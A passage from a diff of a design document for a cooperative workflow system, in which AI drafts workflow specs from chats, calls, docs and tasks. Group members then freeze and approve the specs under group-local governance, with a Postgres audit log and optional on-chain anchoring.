-| 8. Monitor | Dashboard | Real-time status, rollback alerts, audit trail | Live view |
-| 9. Revoke (if needed) | app-stewards Safe | `CoopRegistry.revokeWorkflow()` | All triggers blocked |
+## 5. The Complete Lifecycle (Multi-Party, Group-Local)
+
+| Stage | Actor | Source | Action | Output | Location |
+|---|---|---|---|---|---|
+| 1. Converse | Group members | Chat / call / doc / form / task / dashboard | Discuss need, AI drafts in real time | Living draft | Conversation surface |
+| 2. Freeze | Participants | Same source | Approve draft | Frozen spec + provenance | workflow_audit_log (draft_frozen) |
+| 3. Validate | CI pipeline | Frozen spec YAML | Security, schema, idempotency, contingency | Pass/fail report | workflow_audit_log (validation_passed/failed) |
+| 4. Review | Group Safe / custodians | Pathways run | Threshold vote per group policy | Approval signature | workflow_audit_log (approval_granted) |
+| 5. **Anchor (optional)** | executor | On-chain (if policy says so) | `CoopRegistry.registerWorkflow()` | `auditRoot` + `specHash` | Base L2 (only for canonical/cross-group) |
+| 6. Deploy | executor | Temporal CLI | Register workflow type + task queue | Live workflow | Temporal server |
+| 7. Trigger | Event bus / cron / user | Any valid trigger | `HandoffEnvelope` to Temporal worker | Workflow execution | Temporal + event bus |
+| 8. Monitor | Dashboard | Temporal + event bus | Real-time status, rollback alerts | Live view | Dashboard + workflow_audit_log |
+| 9. Revoke | Group Safe / custodians | On-chain or local per policy | `CoopRegistry.revokeWorkflow()` or local `revoked` event | All triggers blocked | workflow_audit_log (+ Base L2 if canonical) |
+| 10. Fork | Any group | Request audit log via federation | Copy spec, modify, propose in new group | New workflow lineage | New group's workflow_audit_log |
+
+**Key principle:** The Postgres audit log is the **primary** record. On-chain
+is the **optional anchor** for cross-group trust. Groups that never federate
+never pay gas.
+
+---
 
 ---
 
 ## 6. Implementation in the Stack
 
-### New directories
+### New services
 
 ```
 apps/coop-api/src/workflows/
-  proposals/              # YAML specs under review
+  proposals/              # Frozen specs awaiting validation
   generated/              # AI-generated TypeScript (auto-committed)
   activities/             # Reusable activity implementations
   tests/                  # Idempotency + contingency tests
   registry.ts             # On-chain registry client
 
+apps/coop-api/src/chat/
+  hermes-bot.ts           # Matrix bot that drafts workflows from chat
+  freeze-handlers.ts      # "lgtm" / "approve" message handlers
+
+apps/coop-api/src/calls/
+  livekit-transcript.ts   # LiveKit transcript → draft workflow
+  call-ui-api.ts          # Endpoints for call-UI draft display
+
+apps/coop-api/src/docs/
+  doc-workflow-block.ts   # ONLYOFFICE workflow spec block type
+  doc-snapshot.ts         # Snapshot doc state at freeze time
+
+apps/coop-api/src/plane/
+  task-workflow-label.ts  # Watch Plane tasks with `workflow-proposal` label
+  comment-parser.ts       # Extract spec from task description + comments
+
+apps/web/irl-dashboard/src/app/(dashboard-layout)/workflows/
+  page.tsx                # Workflow list + management
+  studio/page.tsx         # Visual node-based builder
+  [id]/page.tsx           # Single workflow detail + history
+  [id]/run/page.tsx       # Dry-run against sandbox data
+  components/
+    WorkflowCanvas.tsx    # React-Flow node graph
+    NodePalette.tsx       # Draggable activity nodes
+    AIPanel.tsx           # Natural language → node suggestions
+    ApprovalPanel.tsx     # Safe vote status, propose button
+    ExecutionHistory.tsx  # Past runs, step-level logs
+    ScopeSelector.tsx     # Which groups can trigger this workflow
+
 temporal/
-  worker.ts               # Main worker — verifies HandoffEnvelope before execution
+  worker.ts               # Verifies HandoffEnvelope before execution
   gateways/               # Pathways HandoffEnvelope → Temporal bridge
+```
+
+### New API endpoints
+
+```typescript
+// POST /api/workflows/draft/chat
+// Body: { room_id, draft_yaml }
+// Hermes bot calls this when a draft is ready in Matrix
+
+// POST /api/workflows/draft/call
+// Body: { call_room, transcript_segments, draft_yaml }
+// LiveKit AI calls this during workflow capture mode
+
+// POST /api/workflows/draft/doc
+// Body: { doc_id, version, draft_yaml }
+// Called when all editors click "Propose for Approval"
+
+// POST /api/workflows/draft/task
+// Body: { task_id, comments, draft_yaml }
+// Called when all assignees say "lgtm"
+
+// POST /api/workflows/freeze
+// Body: { source_type, source_id, spec_yaml }
+// Freezes the draft and starts the validation pipeline
+
+// GET /api/workflows/:name/provenance
+// Returns: { spec, provenance, on_chain_record, ipfs_content }
 ```
 
 ### New CLI commands
 
 ```bash
-# Generate a workflow from a prompt
-npx coop-cli workflow generate --prompt "Check members monthly for renewal..."
+# Replay a conversation that created a workflow
+coop-cli workflow provenance --name annual-membership-renewal
 
-# Validate a workflow spec
-npx coop-cli workflow validate --spec workflows/proposals/annual-membership-renewal.yaml
+# Fork a workflow from another group
+coop-cli workflow fork --from detroit-soil/annual-membership-renewal   --name portland-water/annual-membership-renewal
 
-# Run idempotency tests
-npx coop-cli workflow test-idempotency --spec workflows/proposals/annual-membership-renewal.yaml
-
-# Register an approved workflow
-npx coop-cli workflow register --spec workflows/proposals/annual-membership-renewal.yaml --run pr_0xabc...
-
-# Revoke a workflow
-npx coop-cli workflow revoke --name annual-membership-renewal
+# Dry-run a workflow against test data
+coop-cli workflow simulate --spec workflows/proposals/irrigation.yaml   --input '{"moisture": 15}'
 ```
 
 ---
 
-## 7. Open Questions
+## 7. Open Questions (Updated)
 
-1. **Should AI generation be local or remote?** Local (on-device inference) avoids sending group data to an external API, but requires capable hardware. Remote (BYO key) is easier but leaks workflow intent.
-2. **How do we version activity implementations?** If `db.query` activity changes its behavior, all workflows using it must be re-validated. Should activities also be registered on-chain?
-3. **What is the rollback policy for non-reversible actions?** A blockchain transaction cannot be rolled back. Should the validator flag "non-reversible step — requires A3 autonomy"?
-4. **Can groups fork canonical workflows?** A group may want to modify the "annual membership renewal" workflow for their own rules. Is this a self-hosted workflow (no approval needed) or a canonical variant (requires re-approval)?
+1. **Conversation privacy vs audit trail:** If a workflow is drafted in a
+   private video call, is the transcript retained in group-local Postgres or
+   purged after the workflow is approved? The audit log must record *that*
+   the conversation happened, but does it need the full transcript?
+
+2. **Who can freeze?** In a Matrix room with 50 members, the freeze threshold
+   is a group policy. Should it be configurable per room, or uniform per group?
+
+3. **What if participants disagree?** Alice wants step 3, Bob wants it removed.
+   The draft cannot freeze until consensus. Does the AI propose a merged
+   version? Does the Pathways run arbitrate?
+
+4. **LiveKit transcript accuracy:** If the AI mishears "20%" as "25%," the
+   workflow is wrong. Should critical values be double-checked before freeze?
+
+5. **Forking across groups:** A Portland group forks Detroit's workflow and
+   modifies it. Portland requests Detroit's audit log via the federation gateway.
+   Can Detroit refuse? Should there be a standard "audit request" protocol?
+
+6. **Audit log retention:** A group produces 1000 workflows per year. The audit
+   log grows indefinitely. Should there be a policy to archive old entries to
+   MinIO / Glacier? What happens to the on-chain Merkle root if entries are
+   pruned?
+
+7. **Form schema drift:** If the form fields change, do previously-submitted
+   drafts become invalid? Should the form version be part of the `provenance`?
+
+8. **Dashboard canvas durability:** If a user spends 2 hours building a
+   workflow and their browser crashes, is the draft autosaved server-side?
+
+9. **Real-time AI load:** During a 10-person video call, the AI must
+   transcribe, extract intent, draft YAML, and validate schema in real time.
+   Does this run on-device, on the node, or via an external inference provider?
+
+10. **Group policy enforcement:** What prevents a compromised group admin from
+    changing the workflow policy to `approve: any_admin` and quickly blessing a
+    malicious workflow? Should policy changes themselves require a higher
+    threshold (e.g., main group Safe, not just the workflow-custodians Safe)?
+
+---
 
 ---
 
@@ -618,11 +1001,36 @@ npx coop-cli workflow revoke --name annual-membership-renewal
 
 | Dimension | How it is enforced |
 |---|---|
+| **Multi-party generation** | Chat, call, doc, task — any collaborative surface can spawn a workflow |
+| **Real-time AI assist** | AI drafts during conversation, asks clarifying questions, validates schema |
+| **Freeze mechanism** | Spec is frozen when participants approve (threshold varies by source) |
+| **Provenance** | Conversation artifact pinned to IPFS; referenced in `CoopRegistry` |
 | **Security** | Static AST scanner + activity allowlist + RLS policy comparison |
-| **Versioning** | Semantic versions + git commit + `CoopRegistry.specHash` + Temporal task queue versioning |
+| **Versioning** | Semantic versions + git commit + `CoopRegistry.specHash` + Temporal task queue |
 | **Idempotency** | Mandatory `idempotency.key` + `workflowId` pre-hashing + double-trigger tests |
-| **Contingency** | Mandatory `on_failure`/`on_timeout` handlers + saga compensations + validator checks |
+| **Contingency** | Mandatory `on_failure`/`on_timeout` handlers + saga compensations + rollback validation |
 | **Accountability** | Pathways run with Safe threshold vote + on-chain registration + `HandoffEnvelope` signatures |
+| **Forking** | Any group can fork another group's workflow, with full lineage attribution |
 
-AI assists in drafting. Pathways enforces governance. Validators enforce
-invariants. Temporal executes. The group stays in control.
+AI facilitates. Humans decide. Pathways records. Validators enforce. Temporal
+executes. The group stays in control.
+## Summary
+
+| Dimension | How it is enforced |
+|---|---|
+| **Multi-party generation** | Chat, call, doc, form, task, dashboard — any collaborative surface |
+| **Real-time AI assist** | AI drafts during conversation, asks clarifying questions, validates schema |
+| **Freeze mechanism** | Spec frozen when participants approve (threshold set in group policy) |
+| **Governance** | **Group-local** — each group sets its own propose/approve/threshold policy |
+| **Audit trail** | **Postgres** append-only log under group RLS; full history, no deletion |
+| **On-chain** | **Optional** — only for canonical or cross-group workflows; Merkle root anchors Postgres log |
+| **Provenance** | Conversation artifacts referenced in audit log; fetched from group's own Matrix/File server |
+| **Security** | Static AST scanner + activity allowlist + RLS policy comparison |
+| **Versioning** | Semantic versions + git commit + `specHash` + Temporal task queue versioning |
+| **Idempotency** | Mandatory `idempotency.key` + `workflowId` pre-hashing + double-trigger tests |
+| **Contingency** | Mandatory `on_failure`/`on_timeout` handlers + saga compensations + rollback validation |
+| **Accountability** | Pathways run with group-local Safe threshold + audit log + optional on-chain anchor |
+| **Forking** | Any group can fork another group's workflow by requesting their audit log via federation |
+
+**The core principle:** Groups govern themselves. Their audit trail is theirs.
+On-chain is for when they choose to trust other groups.
